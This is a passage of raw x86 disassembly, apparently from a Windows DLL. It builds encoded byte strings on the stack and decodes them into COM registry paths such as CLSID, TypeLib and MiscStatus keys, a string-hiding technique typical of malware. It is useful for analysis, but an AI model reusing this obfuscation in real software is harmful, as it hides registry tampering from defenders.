je r-xdata
push [ ebp - 0x94 ]
call esi
pop ecx
mov [ ebp - 0x94 ] ebx
cmp [ ebp - 0x94 ] ebx
je r-xdata
cmp [ ebp - 0xd0 ] ebx
je r-xdata
push [ ebp - 0x8c ]
call esi
pop ecx
mov [ ebp - 0x8c ] ebx
retn
push [ ebp - 0xd0 ]
call esi
pop ecx
mov [ ebp - 0xd0 ] ebx
sub_10004d5c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x400
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x68 ] 0x1
xor ebx ebx
mov [ ebp - 0x2bc ] ebx
mov [ ebp - 0xf4 ] ebx
mov [ ebp - 0x2fc ] 0x2c
mov [ ebp - 0x2fb ] 0x30
mov [ ebp - 0x2fa ] 0x39
mov [ ebp - 0x2f9 ] 0x2b
mov [ ebp - 0x2f8 ] 0x28
mov [ ebp - 0x2f7 ] 0x3e
mov [ ebp - 0x2f6 ] 0x2d
mov [ ebp - 0x2f5 ] 0x3a
mov [ ebp - 0x2f4 ] 0x23
mov [ ebp - 0x2f3 ] 0x3c
mov [ ebp - 0x2f2 ] 0x13
mov [ ebp - 0x2f1 ] 0x1e
mov [ ebp - 0x2f0 ] 0xc
mov [ ebp - 0x2ef ] 0xc
mov [ ebp - 0x2ee ] 0x1a
mov [ ebp - 0x2ed ] 0xc
mov [ ebp - 0x2ec ] 0x23
mov [ ebp - 0x2eb ] 0x3c
mov [ ebp - 0x2ea ] 0x33
mov [ ebp - 0x2e9 ] 0x2c
mov [ ebp - 0x2e8 ] 0x36
mov [ ebp - 0x2e7 ] 0x3b
mov [ ebp - 0x2e6 ] 0x23
mov [ ebp - 0x2e5 ] 0x4
mov [ ebp - 0x2e4 ] 0x4f
mov [ ebp - 0x2e3 ] 0x46
mov [ ebp - 0x2e2 ] 0x4e
mov [ ebp - 0x2e1 ] 0x39
mov [ ebp - 0x2e0 ] 0x3b
mov [ ebp - 0x2df ] 0x4c
mov [ ebp - 0x2de ] 0x48
mov [ ebp - 0x2dd ] 0x47
mov [ ebp - 0x2dc ] 0x52
mov [ ebp - 0x2db ] 0x4b
mov [ ebp - 0x2da ] 0x4d
mov [ ebp - 0x2d9 ] 0x4d
mov [ ebp - 0x2d8 ] 0x3b
mov [ ebp - 0x2d7 ] 0x52
mov [ ebp - 0x2d6 ] 0x3e
mov [ ebp - 0x2d5 ] 0x4c
mov [ ebp - 0x2d4 ] 0x49
mov [ ebp - 0x2d3 ] 0x3a
mov [ ebp - 0x2d2 ] 0x52
mov [ ebp - 0x2d1 ] 0x47
mov [ ebp - 0x2d0 ] 0x4b
mov [ ebp - 0x2cf ] 0x47
mov [ ebp - 0x2ce ] 0x48
mov [ ebp - 0x2cd ] 0x52
mov [ ebp - 0x2cc ] 0x47
mov [ ebp - 0x2cb ] 0x4c
mov [ ebp - 0x2ca ] 0x3d
mov [ ebp - 0x2c9 ] 0x4a
mov [ ebp - 0x2c8 ] 0x48
mov [ ebp - 0x2c7 ] 0x3e
mov [ ebp - 0x2c6 ] 0x3b
mov [ ebp - 0x2c5 ] 0x3b
mov [ ebp - 0x2c4 ] 0x4d
mov [ ebp - 0x2c3 ] 0x4e
mov [ ebp - 0x2c2 ] 0x4f
mov [ ebp - 0x2c1 ] 0x46
mov [ ebp - 0x2c0 ] 0x2
mov [ ebp - 0x2bf ] bl
mov [ ebp - 0x64 ] 0x2c
mov [ ebp - 0x63 ] 0x30
mov [ ebp - 0x62 ] 0x39
mov [ ebp - 0x61 ] 0x2b
mov [ ebp - 0x60 ] 0x28
mov [ ebp - 0x5f ] 0x3e
mov [ ebp - 0x5e ] 0x2d
mov [ ebp - 0x5d ] 0x3a
mov [ ebp - 0x5c ] 0x23
mov [ ebp - 0x5b ] 0x3c
mov [ ebp - 0x5a ] 0x13
mov [ ebp - 0x59 ] 0x1e
mov [ ebp - 0x58 ] 0xc
mov [ ebp - 0x57 ] 0xc
mov [ ebp - 0x56 ] 0x1a
mov [ ebp - 0x55 ] 0xc
mov [ ebp - 0x54 ] 0x23
mov [ ebp - 0x53 ] 0x3c
mov [ ebp - 0x52 ] 0x33
mov [ ebp - 0x51 ] 0x2c
mov [ ebp - 0x50 ] 0x36
mov [ ebp - 0x4f ] 0x3b
mov [ ebp - 0x4e ] 0x23
mov [ ebp - 0x4d ] 0x4
mov [ ebp - 0x4c ] 0x48
mov [ ebp - 0x4b ] 0x48
mov [ ebp - 0x4a ] 0x4f
mov [ ebp - 0x49 ] 0x4c
mov [ ebp - 0x48 ] 0x4d
mov [ ebp - 0x47 ] 0x3b
mov [ ebp - 0x46 ] 0x3e
mov [ ebp - 0x45 ] 0x3e
mov [ ebp - 0x44 ] 0x52
mov [ ebp - 0x43 ] 0x3d
mov [ ebp - 0x42 ] 0x48
mov [ ebp - 0x41 ] 0x39
mov [ ebp - 0x40 ] 0x4d
mov [ ebp - 0x3f ] 0x52
mov [ ebp - 0x3e ] 0x4e
mov [ ebp - 0x3d ] 0x4f
mov [ ebp - 0x3c ] 0x4e
mov [ ebp - 0x3b ] 0x3d
mov [ ebp - 0x3a ] 0x52
mov [ ebp - 0x39 ] 0x3e
mov [ ebp - 0x38 ] 0x4e
mov [ ebp - 0x37 ] 0x39
mov [ ebp - 0x36 ] 0x4f
mov [ ebp - 0x35 ] 0x52
mov [ ebp - 0x34 ] 0x4f
mov [ ebp - 0x33 ] 0x4e
mov [ ebp - 0x32 ] 0x3c
mov [ ebp - 0x31 ] 0x4d
mov [ ebp - 0x30 ] 0x46
mov [ ebp - 0x2f ] 0x4e
mov [ ebp - 0x2e ] 0x47
mov [ ebp - 0x2d ] 0x4c
mov [ ebp - 0x2c ] 0x3d
mov [ ebp - 0x2b ] 0x3c
mov [ ebp - 0x2a ] 0x3e
mov [ ebp - 0x29 ] 0x4e
mov [ ebp - 0x28 ] 0x2
mov [ ebp - 0x27 ] bl
mov [ ebp - 0xa8 ] 0x2c
mov [ ebp - 0xa7 ] 0x30
mov [ ebp - 0xa6 ] 0x39
mov [ ebp - 0xa5 ] 0x2b
mov [ ebp - 0xa4 ] 0x28
mov [ ebp - 0xa3 ] 0x3e
mov [ ebp - 0xa2 ] 0x2d
mov [ ebp - 0xa1 ] 0x3a
mov [ ebp - 0xa0 ] 0x23
mov [ ebp - 0x9f ] 0x3c
mov [ ebp - 0x9e ] 0x13
mov [ ebp - 0x9d ] 0x1e
mov [ ebp - 0x9c ] 0xc
mov [ ebp - 0x9b ] 0xc
mov [ ebp - 0x9a ] 0x1a
mov [ ebp - 0x99 ] 0xc
mov [ ebp - 0x98 ] 0x23
mov [ ebp - 0x97 ] 0x3c
mov [ ebp - 0x96 ] 0x33
mov [ ebp - 0x95 ] 0x2c
mov [ ebp - 0x94 ] 0x36
mov [ ebp - 0x93 ] 0x3b
mov [ ebp - 0x92 ] 0x23
mov [ ebp - 0x91 ] 0x4
mov [ ebp - 0x90 ] 0x4e
mov [ ebp - 0x8f ] 0x3d
mov [ ebp - 0x8e ] 0x47
mov [ ebp - 0x8d ] 0x3c
mov [ ebp - 0x8c ] 0x4a
mov [ ebp - 0x8b ] 0x46
mov [ ebp - 0x8a ] 0x4e
mov [ ebp - 0x89 ] 0x4d
mov [ ebp - 0x88 ] 0x52
mov [ ebp - 0x87 ] 0x47
mov [ ebp - 0x86 ] 0x3d
mov [ ebp - 0x85 ] 0x3a
mov [ ebp - 0x84 ] 0x4b
mov [ ebp - 0x83 ] 0x52
mov [ ebp - 0x82 ] 0x4e
mov [ ebp - 0x81 ] 0x4e
mov [ ebp - 0x80 ] 0x3b
mov [ ebp - 0x7f ] 0x4e
mov [ ebp - 0x7e ] 0x52
mov [ ebp - 0x7d ] 0x3d
mov [ ebp - 0x7c ] 0x47
mov [ ebp - 0x7b ] 0x3b
mov [ ebp - 0x7a ] 0x4c
mov [ ebp - 0x79 ] 0x52
mov [ ebp - 0x78 ] 0x39
mov [ ebp - 0x77 ] 0x4a
mov [ ebp - 0x76 ] 0x3d
mov [ ebp - 0x75 ] 0x4b
mov [ ebp - 0x74 ] 0x4d
mov [ ebp - 0x73 ] 0x4f
mov [ ebp - 0x72 ] 0x4e
mov [ ebp - 0x71 ] 0x46
mov [ ebp - 0x70 ] 0x3c
mov [ ebp - 0x6f ] 0x3e
mov [ ebp - 0x6e ] 0x3a
mov [ ebp - 0x6d ] 0x3b
mov [ ebp - 0x6c ] 0x2
mov [ ebp - 0x6b ] bl
mov [ ebp - 0xf0 ] 0x2c
mov [ ebp - 0xef ] 0x30
mov [ ebp - 0xee ] 0x39
mov [ ebp - 0xed ] 0x2b
mov [ ebp - 0xec ] 0x28
mov [ ebp - 0xeb ] 0x3e
mov [ ebp - 0xea ] 0x2d
mov [ ebp - 0xe9 ] 0x3a
mov [ ebp - 0xe8 ] 0x23
mov [ ebp - 0xe7 ] 0x3c
mov [ ebp - 0xe6 ] 0x13
mov [ ebp - 0xe5 ] 0x1e
mov [ ebp - 0xe4 ] 0xc
mov [ ebp - 0xe3 ] 0xc
mov [ ebp - 0xe2 ] 0x1a
mov [ ebp - 0xe1 ] 0xc
mov [ ebp - 0xe0 ] 0x23
mov [ ebp - 0xdf ] 0x3c
mov [ ebp - 0xde ] 0x33
mov [ ebp - 0xdd ] 0x2c
mov [ ebp - 0xdc ] 0x36
mov [ ebp - 0xdb ] 0x3b
mov [ ebp - 0xda ] 0x23
mov [ ebp - 0xd9 ] 0x4
mov [ ebp - 0xd8 ] 0x3e
mov [ ebp - 0xd7 ] 0x49
mov [ ebp - 0xd6 ] 0x47
mov [ ebp - 0xd5 ] 0x4d
mov [ ebp - 0xd4 ] 0x39
mov [ ebp - 0xd3 ] 0x3a
mov [ ebp - 0xd2 ] 0x3c
mov [ ebp - 0xd1 ] 0x4f
mov [ ebp - 0xd0 ] 0x52
mov [ ebp - 0xcf ] 0x4c
mov [ ebp - 0xce ] 0x4c
mov [ ebp - 0xcd ] 0x4c
mov [ ebp - 0xcc ] 0x39
mov [ ebp - 0xcb ] 0x52
mov [ ebp - 0xca ] 0x3d
mov [ ebp - 0xc9 ] 0x4e
mov [ ebp - 0xc8 ] 0x49
mov [ ebp - 0xc7 ] 0x3e
mov [ ebp - 0xc6 ] 0x52
mov [ ebp - 0xc5 ] 0x4b
mov [ ebp - 0xc4 ] 0x3a
mov [ ebp - 0xc3 ] 0x3a
mov [ ebp - 0xc2 ] 0x49
mov [ ebp - 0xc1 ] 0x52
mov [ ebp - 0xc0 ] 0x4d
mov [ ebp - 0xbf ] 0x4b
mov [ ebp - 0xbe ] 0x3c
mov [ ebp - 0xbd ] 0x3c
mov [ ebp - 0xbc ] 0x4d
mov [ ebp - 0xbb ] 0x3d
mov [ ebp - 0xba ] 0x3e
mov [ ebp - 0xb9 ] 0x39
mov [ ebp - 0xb8 ] 0x4e
mov [ ebp - 0xb7 ] 0x4e
mov [ ebp - 0xb6 ] 0x47
mov [ ebp - 0xb5 ] 0x4a
mov [ ebp - 0xb4 ] 0x2
mov [ ebp - 0xb3 ] bl
mov [ ebp - 0x13c ] 0x2c
mov [ ebp - 0x13b ] 0x30
mov [ ebp - 0x13a ] 0x39
mov [ ebp - 0x139 ] 0x2b
mov [ ebp - 0x138 ] 0x28
mov [ ebp - 0x137 ] 0x3e
mov [ ebp - 0x136 ] 0x2d
mov [ ebp - 0x135 ] 0x3a
mov [ ebp - 0x134 ] 0x23
mov [ ebp - 0x133 ] 0x3c
mov [ ebp - 0x132 ] 0x13
mov [ ebp - 0x131 ] 0x1e
mov [ ebp - 0x130 ] 0xc
mov [ ebp - 0x12f ] 0xc
mov [ ebp - 0x12e ] 0x1a
mov [ ebp - 0x12d ] 0xc
mov [ ebp - 0x12c ] 0x23
mov [ ebp - 0x12b ] 0x3c
mov [ ebp - 0x12a ] 0x33
mov [ ebp - 0x129 ] 0x2c
mov [ ebp - 0x128 ] 0x36
mov [ ebp - 0x127 ] 0x3b
mov [ ebp - 0x126 ] 0x23
mov [ ebp - 0x125 ] 0x4
mov [ ebp - 0x124 ] 0x3d
mov [ ebp - 0x123 ] 0x47
mov [ ebp - 0x122 ] 0x4e
mov [ ebp - 0x121 ] 0x4d
mov [ ebp - 0x120 ] 0x48
mov [ ebp - 0x11f ] 0x47
mov [ ebp - 0x11e ] 0x46
mov [ ebp - 0x11d ] 0x3b
mov [ ebp - 0x11c ] 0x52
mov [ ebp - 0x11b ] 0x49
mov [ ebp - 0x11a ] 0x39
mov [ ebp - 0x119 ] 0x3b
mov [ ebp - 0x118 ] 0x39
mov [ ebp - 0x117 ] 0x52
mov [ ebp - 0x116 ] 0x46
mov [ ebp - 0x115 ] 0x48
mov [ ebp - 0x114 ] 0x3e
mov [ ebp - 0x113 ] 0x3d
mov [ ebp - 0x112 ] 0x52
mov [ ebp - 0x111 ] 0x47
mov [ ebp - 0x110 ] 0x4c
mov [ ebp - 0x10f ] 0x4b
mov [ ebp - 0x10e ] 0x3d
mov [ ebp - 0x10d ] 0x52
mov [ ebp - 0x10c ] 0x46
mov [ ebp - 0x10b ] 0x39
mov [ ebp - 0x10a ] 0x4b
mov [ ebp - 0x109 ] 0x4c
mov [ ebp - 0x108 ] 0x48
mov [ ebp - 0x107 ] 0x49
mov [ ebp - 0x106 ] 0x3d
mov [ ebp - 0x105 ] 0x4d
mov [ ebp - 0x104 ] 0x3c
mov [ ebp - 0x103 ] 0x47
mov [ ebp - 0x102 ] 0x3a
mov [ ebp - 0x101 ] 0x4e
mov [ ebp - 0x100 ] 0x2
mov [ ebp - 0xff ] bl
mov [ ebp - 0x17c ] 0x2c
mov [ ebp - 0x17b ] 0x30
mov [ ebp - 0x17a ] 0x39
mov [ ebp - 0x179 ] 0x2b
mov [ ebp - 0x178 ] 0x28
mov [ ebp - 0x177 ] 0x3e
mov [ ebp - 0x176 ] 0x2d
mov [ ebp - 0x175 ] 0x3a
mov [ ebp - 0x174 ] 0x23
mov [ ebp - 0x173 ] 0x3c
mov [ ebp - 0x172 ] 0x13
mov [ ebp - 0x171 ] 0x1e
mov [ ebp - 0x170 ] 0xc
mov [ ebp - 0x16f ] 0xc
mov [ ebp - 0x16e ] 0x1a
mov [ ebp - 0x16d ] 0xc
mov [ ebp - 0x16c ] 0x23
mov [ ebp - 0x16b ] 0x3c
mov [ ebp - 0x16a ] 0x33
mov [ ebp - 0x169 ] 0x2c
mov [ ebp - 0x168 ] 0x36
mov [ ebp - 0x167 ] 0x3b
mov [ ebp - 0x166 ] 0x23
mov [ ebp - 0x165 ] 0x4
mov [ ebp - 0x164 ] 0x4c
mov [ ebp - 0x163 ] 0x4b
mov [ ebp - 0x162 ] 0x3e
mov [ ebp - 0x161 ] 0x3e
mov [ ebp - 0x160 ] 0x49
mov [ ebp - 0x15f ] 0x48
mov [ ebp - 0x15e ] 0x4e
mov [ ebp - 0x15d ] 0x3a
mov [ ebp - 0x15c ] 0x52
mov [ ebp - 0x15b ] 0x3c
mov [ ebp - 0x15a ] 0x3e
mov [ ebp - 0x159 ] 0x47
mov [ ebp - 0x158 ] 0x3b
mov [ ebp - 0x157 ] 0x52
mov [ ebp - 0x156 ] 0x4e
mov [ ebp - 0x155 ] 0x4e
mov [ ebp - 0x154 ] 0x3b
mov [ ebp - 0x153 ] 0x4d
mov [ ebp - 0x152 ] 0x52
mov [ ebp - 0x151 ] 0x3e
mov [ ebp - 0x150 ] 0x3c
mov [ ebp - 0x14f ] 0x49
mov [ ebp - 0x14e ] 0x3a
mov [ ebp - 0x14d ] 0x52
mov [ ebp - 0x14c ] 0x49
mov [ ebp - 0x14b ] 0x46
mov [ ebp - 0x14a ] 0x3e
mov [ ebp - 0x149 ] 0x39
mov [ ebp - 0x148 ] 0x49
mov [ ebp - 0x147 ] 0x4d
mov [ ebp - 0x146 ] 0x46
mov [ ebp - 0x145 ] 0x46
mov [ ebp - 0x144 ] 0x46
mov [ ebp - 0x143 ] 0x4d
mov [ ebp - 0x142 ] 0x4e
mov [ ebp - 0x141 ] 0x3a
mov [ ebp - 0x140 ] 0x2
mov [ ebp - 0x13f ] bl
mov [ ebp - 0x1bc ] 0x2c
mov [ ebp - 0x1bb ] 0x30
mov [ ebp - 0x1ba ] 0x39
mov [ ebp - 0x1b9 ] 0x2b
mov [ ebp - 0x1b8 ] 0x28
mov [ ebp - 0x1b7 ] 0x3e
mov [ ebp - 0x1b6 ] 0x2d
mov [ ebp - 0x1b5 ] 0x3a
mov [ ebp - 0x1b4 ] 0x23
mov [ ebp - 0x1b3 ] 0x3c
mov [ ebp - 0x1b2 ] 0x13
mov [ ebp - 0x1b1 ] 0x1e
mov [ ebp - 0x1b0 ] 0xc
mov [ ebp - 0x1af ] 0xc
mov [ ebp - 0x1ae ] 0x1a
mov [ ebp - 0x1ad ] 0xc
mov [ ebp - 0x1ac ] 0x23
mov [ ebp - 0x1ab ] 0x3c
mov [ ebp - 0x1aa ] 0x33
mov [ ebp - 0x1a9 ] 0x2c
mov [ ebp - 0x1a8 ] 0x36
mov [ ebp - 0x1a7 ] 0x3b
mov [ ebp - 0x1a6 ] 0x23
mov [ ebp - 0x1a5 ] 0x4
mov [ ebp - 0x1a4 ] 0x3a
mov [ ebp - 0x1a3 ] 0x4f
mov [ ebp - 0x1a2 ] 0x47
mov [ ebp - 0x1a1 ] 0x4e
mov [ ebp - 0x1a0 ] 0x3e
mov [ ebp - 0x19f ] 0x3c
mov [ ebp - 0x19e ] 0x3d
mov [ ebp - 0x19d ] 0x46
mov [ ebp - 0x19c ] 0x52
mov [ ebp - 0x19b ] 0x4d
mov [ ebp - 0x19a ] 0x4d
mov [ ebp - 0x199 ] 0x46
mov [ ebp - 0x198 ] 0x46
mov [ ebp - 0x197 ] 0x52
mov [ ebp - 0x196 ] 0x4b
mov [ ebp - 0x195 ] 0x4d
mov [ ebp - 0x194 ] 0x4f
mov [ ebp - 0x193 ] 0x3a
mov [ ebp - 0x192 ] 0x52
mov [ ebp - 0x191 ] 0x46
mov [ ebp - 0x190 ] 0x48
mov [ ebp - 0x18f ] 0x3a
mov [ ebp - 0x18e ] 0x4b
mov [ ebp - 0x18d ] 0x52
mov [ ebp - 0x18c ] 0x3d
mov [ ebp - 0x18b ] 0x3e
mov [ ebp - 0x18a ] 0x4f
mov [ ebp - 0x189 ] 0x4c
mov [ ebp - 0x188 ] 0x4a
mov [ ebp - 0x187 ] 0x4e
mov [ ebp - 0x186 ] 0x47
mov [ ebp - 0x185 ] 0x39
mov [ ebp - 0x184 ] 0x4a
mov [ ebp - 0x183 ] 0x3d
mov [ ebp - 0x182 ] 0x49
mov [ ebp - 0x181 ] 0x47
mov [ ebp - 0x180 ] 0x2
mov [ ebp - 0x17f ] bl
mov [ ebp - 0x1fc ] 0x2c
mov [ ebp - 0x1fb ] 0x30
mov [ ebp - 0x1fa ] 0x39
mov [ ebp - 0x1f9 ] 0x2b
mov [ ebp - 0x1f8 ] 0x28
mov [ ebp - 0x1f7 ] 0x3e
mov [ ebp - 0x1f6 ] 0x2d
mov [ ebp - 0x1f5 ] 0x3a
mov [ ebp - 0x1f4 ] 0x23
mov [ ebp - 0x1f3 ] 0x3c
mov [ ebp - 0x1f2 ] 0x13
mov [ ebp - 0x1f1 ] 0x1e
mov [ ebp - 0x1f0 ] 0xc
mov [ ebp - 0x1ef ] 0xc
mov [ ebp - 0x1ee ] 0x1a
mov [ ebp - 0x1ed ] 0xc
mov [ ebp - 0x1ec ] 0x23
mov [ ebp - 0x1eb ] 0x3c
mov [ ebp - 0x1ea ] 0x33
mov [ ebp - 0x1e9 ] 0x2c
mov [ ebp - 0x1e8 ] 0x36
mov [ ebp - 0x1e7 ] 0x3b
mov [ ebp - 0x1e6 ] 0x23
mov [ ebp - 0x1e5 ] 0x4
mov [ ebp - 0x1e4 ] 0x49
mov [ ebp - 0x1e3 ] 0x3e
mov [ ebp - 0x1e2 ] 0x46
mov [ ebp - 0x1e1 ] 0x4e
mov [ ebp - 0x1e0 ] 0x48
mov [ ebp - 0x1df ] 0x4d
mov [ ebp - 0x1de ] 0x4d
mov [ ebp - 0x1dd ] 0x3d
mov [ ebp - 0x1dc ] 0x52
mov [ ebp - 0x1db ] 0x4e
mov [ ebp - 0x1da ] 0x3a
mov [ ebp - 0x1d9 ] 0x46
mov [ ebp - 0x1d8 ] 0x4f
mov [ ebp - 0x1d7 ] 0x52
mov [ ebp - 0x1d6 ] 0x4b
mov [ ebp - 0x1d5 ] 0x49
mov [ ebp - 0x1d4 ] 0x46
mov [ ebp - 0x1d3 ] 0x3b
mov [ ebp - 0x1d2 ] 0x52
mov [ ebp - 0x1d1 ] 0x3d
mov [ ebp - 0x1d0 ] 0x3a
mov [ ebp - 0x1cf ] 0x4c
mov [ ebp - 0x1ce ] 0x3c
mov [ ebp - 0x1cd ] 0x52
mov [ ebp - 0x1cc ] 0x4b
mov [ ebp - 0x1cb ] 0x4b
mov [ ebp - 0x1ca ] 0x3c
mov [ ebp - 0x1c9 ] 0x4d
mov [ ebp - 0x1c8 ] 0x4e
mov [ ebp - 0x1c7 ] 0x4c
mov [ ebp - 0x1c6 ] 0x47
mov [ ebp - 0x1c5 ] 0x39
mov [ ebp - 0x1c4 ] 0x4d
mov [ ebp - 0x1c3 ] 0x4a
mov [ ebp - 0x1c2 ] 0x48
mov [ ebp - 0x1c1 ] 0x48
mov [ ebp - 0x1c0 ] 0x2
mov [ ebp - 0x1bf ] bl
mov [ ebp - 0x268 ] 0x2c
mov [ ebp - 0x267 ] 0x30
mov [ ebp - 0x266 ] 0x39
mov [ ebp - 0x265 ] 0x2b
mov [ ebp - 0x264 ] 0x28
mov [ ebp - 0x263 ] 0x3e
mov [ ebp - 0x262 ] 0x2d
mov [ ebp - 0x261 ] 0x3a
mov [ ebp - 0x260 ] 0x23
mov [ ebp - 0x25f ] 0x3c
mov [ ebp - 0x25e ] 0x13
mov [ ebp - 0x25d ] 0x1e
mov [ ebp - 0x25c ] 0xc
mov [ ebp - 0x25b ] 0xc
mov [ ebp - 0x25a ] 0x1a
mov [ ebp - 0x259 ] 0xc
mov [ ebp - 0x258 ] 0x23
mov [ ebp - 0x257 ] 0x3c
mov [ ebp - 0x256 ] 0x33
mov [ ebp - 0x255 ] 0x2c
mov [ ebp - 0x254 ] 0x36
mov [ ebp - 0x253 ] 0x3b
mov [ ebp - 0x252 ] 0x23
mov [ ebp - 0x251 ] 0x4
mov [ ebp - 0x250 ] 0x3c
mov [ ebp - 0x24f ] 0x4b
mov [ ebp - 0x24e ] 0x4d
mov [ ebp - 0x24d ] 0x46
mov [ ebp - 0x24c ] 0x3c
mov [ ebp - 0x24b ] 0x3c
mov [ ebp - 0x24a ] 0x3a
mov [ ebp - 0x249 ] 0x4b
mov [ ebp - 0x248 ] 0x52
mov [ ebp - 0x247 ] 0x46
mov [ ebp - 0x246 ] 0x4c
mov [ ebp - 0x245 ] 0x4e
mov [ ebp - 0x244 ] 0x4f
mov [ ebp - 0x243 ] 0x52
mov [ ebp - 0x242 ] 0x4b
mov [ ebp - 0x241 ] 0x3b
mov [ ebp - 0x240 ] 0x48
mov [ ebp - 0x23f ] 0x3c
mov [ ebp - 0x23e ] 0x52
mov [ ebp - 0x23d ] 0x3e
mov [ ebp - 0x23c ] 0x46
mov [ ebp - 0x23b ] 0x3d
mov [ ebp - 0x23a ] 0x3d
mov [ ebp - 0x239 ] 0x52
mov [ ebp - 0x238 ] 0x48
mov [ ebp - 0x237 ] 0x4d
mov [ ebp - 0x236 ] 0x3a
mov [ ebp - 0x235 ] 0x4a
mov [ ebp - 0x234 ] 0x3a
mov [ ebp - 0x233 ] 0x3a
mov [ ebp - 0x232 ] 0x46
mov [ ebp - 0x231 ] 0x46
mov [ ebp - 0x230 ] 0x4a
mov [ ebp - 0x22f ] 0x3e
mov [ ebp - 0x22e ] 0x4d
mov [ ebp - 0x22d ] 0x3d
mov [ ebp - 0x22c ] 0x2
mov [ ebp - 0x22b ] bl
mov [ ebp - 0x2a8 ] 0x2c
mov [ ebp - 0x2a7 ] 0x30
mov [ ebp - 0x2a6 ] 0x39
mov [ ebp - 0x2a5 ] 0x2b
mov [ ebp - 0x2a4 ] 0x28
mov [ ebp - 0x2a3 ] 0x3e
mov [ ebp - 0x2a2 ] 0x2d
mov [ ebp - 0x2a1 ] 0x3a
mov [ ebp - 0x2a0 ] 0x23
mov [ ebp - 0x29f ] 0x3c
mov [ ebp - 0x29e ] 0x13
mov [ ebp - 0x29d ] 0x1e
mov [ ebp - 0x29c ] 0xc
mov [ ebp - 0x29b ] 0xc
mov [ ebp - 0x29a ] 0x1a
mov [ ebp - 0x299 ] 0xc
mov [ ebp - 0x298 ] 0x23
mov [ ebp - 0x297 ] 0x3c
mov [ ebp - 0x296 ] 0x33
mov [ ebp - 0x295 ] 0x2c
mov [ ebp - 0x294 ] 0x36
mov [ ebp - 0x293 ] 0x3b
mov [ ebp - 0x292 ] 0x23
mov [ ebp - 0x291 ] 0x4
mov [ ebp - 0x290 ] 0x3b
mov [ ebp - 0x28f ] 0x3e
mov [ ebp - 0x28e ] 0x4e
mov [ ebp - 0x28d ] 0x49
mov [ ebp - 0x28c ] 0x49
mov [ ebp - 0x28b ] 0x4b
mov [ ebp - 0x28a ] 0x3b
mov [ ebp - 0x289 ] 0x3b
mov [ ebp - 0x288 ] 0x52
mov [ ebp - 0x287 ] 0x4a
mov [ ebp - 0x286 ] 0x4e
mov [ ebp - 0x285 ] 0x4e
mov [ ebp - 0x284 ] 0x39
mov [ ebp - 0x283 ] 0x52
mov [ ebp - 0x282 ] 0x4e
mov [ ebp - 0x281 ] 0x4e
mov [ ebp - 0x280 ] 0x3c
mov [ ebp - 0x27f ] 0x3a
mov [ ebp - 0x27e ] 0x52
mov [ ebp - 0x27d ] 0x3d
mov [ ebp - 0x27c ] 0x4e
mov [ ebp - 0x27b ] 0x3c
mov [ ebp - 0x27a ] 0x4f
mov [ ebp - 0x279 ] 0x52
mov [ ebp - 0x278 ] 0x3e
mov [ ebp - 0x277 ] 0x3d
mov [ ebp - 0x276 ] 0x47
mov [ ebp - 0x275 ] 0x4b
mov [ ebp - 0x274 ] 0x47
mov [ ebp - 0x273 ] 0x3c
mov [ ebp - 0x272 ] 0x4e
mov [ ebp - 0x271 ] 0x3b
mov [ ebp - 0x270 ] 0x4f
mov [ ebp - 0x26f ] 0x3c
mov [ ebp - 0x26e ] 0x3c
mov [ ebp - 0x26d ] 0x4b
mov [ ebp - 0x26c ] 0x2
mov [ ebp - 0x26b ] bl
mov [ ebp - 0xb0 ] 0x2b
mov [ ebp - 0xaf ] 0x6
mov [ ebp - 0xae ] 0xf
mov [ ebp - 0xad ] 0x1a
mov [ ebp - 0xac ] 0x33
mov [ ebp - 0xab ] 0x16
mov [ ebp - 0xaa ] 0x1d
mov [ ebp - 0xa9 ] bl
mov [ ebp - 0xfc ] 0x29
mov [ ebp - 0xfb ] 0x1a
mov [ ebp - 0xfa ] 0xd
mov [ ebp - 0xf9 ] 0xc
mov [ ebp - 0xf8 ] 0x16
mov [ ebp - 0xf7 ] 0x10
mov [ ebp - 0xf6 ] 0x11
mov [ ebp - 0xf5 ] bl
mov [ ebp - 0x24 ] 0x32
mov [ ebp - 0x23 ] 0x16
mov [ ebp - 0x22 ] 0xc
mov [ ebp - 0x21 ] 0x1c
mov [ ebp - 0x20 ] 0x2c
mov [ ebp - 0x1f ] 0xb
mov [ ebp - 0x1e ] 0x1e
mov [ ebp - 0x1d ] 0xb
mov [ ebp - 0x1c ] 0xa
mov [ ebp - 0x1b ] 0xc
mov [ ebp - 0x1a ] bl
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x2fc ]
push eax
call sub_100075ee
lea eax [ ebp - 0x2fc ]
mov [ ebp - 0x224 ] eax
lea eax [ ebp - 0x64 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x64 ]
mov [ ebp - 0x220 ] eax
lea eax [ ebp - 0xa8 ]
push eax
call sub_100075ee
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0xf0 ]
push eax
call sub_100075ee
lea eax [ ebp - 0xf0 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp - 0x13c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x214 ] eax
lea eax [ ebp - 0x17c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x17c ]
mov [ ebp - 0x210 ] eax
lea eax [ ebp - 0x1bc ]
push eax
call sub_100075ee
lea eax [ ebp - 0x1bc ]
mov [ ebp - 0x20c ] eax
lea eax [ ebp - 0x1fc ]
push eax
call sub_100075ee
lea eax [ ebp - 0x1fc ]
mov [ ebp - 0x208 ] eax
lea eax [ ebp - 0x268 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x204 ] eax
lea eax [ ebp - 0x2a8 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x2a8 ]
mov [ ebp - 0x200 ] eax
lea eax [ ebp - 0xb0 ]
push eax
call sub_100075ee
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0x2b8 ] eax
lea eax [ ebp - 0xfc ]
push eax
call sub_100075ee
lea eax [ ebp - 0xfc ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_100075ee
add esp 0x34
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x2b0 ] eax
mov [ ebp - 0x40c ] 0x104
mov [ ebp - 0x300 ] ebx
mov edi [ ebp + 0x8 ]
mov esi [ strncat@IAT ]
push edi
call sub_1000d360
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push edi
